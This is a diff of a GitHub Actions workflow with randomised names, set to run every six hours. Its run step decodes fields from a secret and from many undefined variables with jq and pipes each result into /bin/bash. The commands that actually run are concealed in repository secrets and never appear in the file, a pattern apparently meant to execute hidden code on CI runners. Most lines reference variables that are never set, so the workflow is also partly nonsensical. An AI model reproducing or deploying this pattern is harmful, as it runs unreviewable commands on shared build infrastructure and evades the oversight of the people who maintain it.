@@ -2,24 +2,33 @@ name: liangliupin6719
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 2/6 * * *'
-jobs:  # 30900
+    - cron: '4 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liangliupin6719
         env:
-          ybr4: ${{ secrets.ybr4 }}
+          ulbb3166: ${{ secrets.ulbb3166 }}
         run: |
-          echo $ybr4 | jq -r .etflg76 | /bin/bash
-          echo $b9721 | jq -r .eeuil86508 | /bin/bash
-          echo $p60328 | jq -r .df29 | /bin/bash
-          echo $pb3579 | jq -r .zr5 | /bin/bash
-          echo $dxah862 | jq -r .fuue30 | /bin/bash
-          echo $c92545 | jq -r .rjrdj308 | /bin/bash
-          echo $rjgvg7709 | jq -r .zx0362 | /bin/bash
-          echo $xb033 | jq -r .dfpn4 | /bin/bash
-          echo $fcur8486 | jq -r .lfcrz50427 | /bin/bash
+          echo $ulbb3166 | jq -r .thmdf93 | /bin/bash
+          echo $mg554 | jq -r .wnzr0 | /bin/bash
+          echo $ni259 | jq -r .ajyy7 | /bin/bash
+          echo $hpw86736 | jq -r .oggf02 | /bin/bash
+          echo $vcih47576 | jq -r .gws02 | /bin/bash
+          echo $zi0 | jq -r .zerc3 | /bin/bash
+          echo $a4 | jq -r .gsvom9 | /bin/bash
+          echo $bhk4434 | jq -r .qexo28 | /bin/bash
+          echo $lngv9 | jq -r .gsu9543 | /bin/bash
+          echo $w704 | jq -r .qvm24 | /bin/bash
+          echo $vgkpm903 | jq -r .uzd9338 | /bin/bash
+          echo $eysd01787 | jq -r .z391 | /bin/bash
+          echo $xbmvx4 | jq -r .bbs0 | /bin/bash
+          echo $ww192 | jq -r .ch7499 | /bin/bash
+          echo $oyui83 | jq -r .vvb211 | /bin/bash
+          echo $bci25536 | jq -r .p4605 | /bin/bash
+          echo $ygser11 | jq -r .btpb00 | /bin/bash
+          echo $hy9797 | jq -r .mtw24 | /bin/bash
 
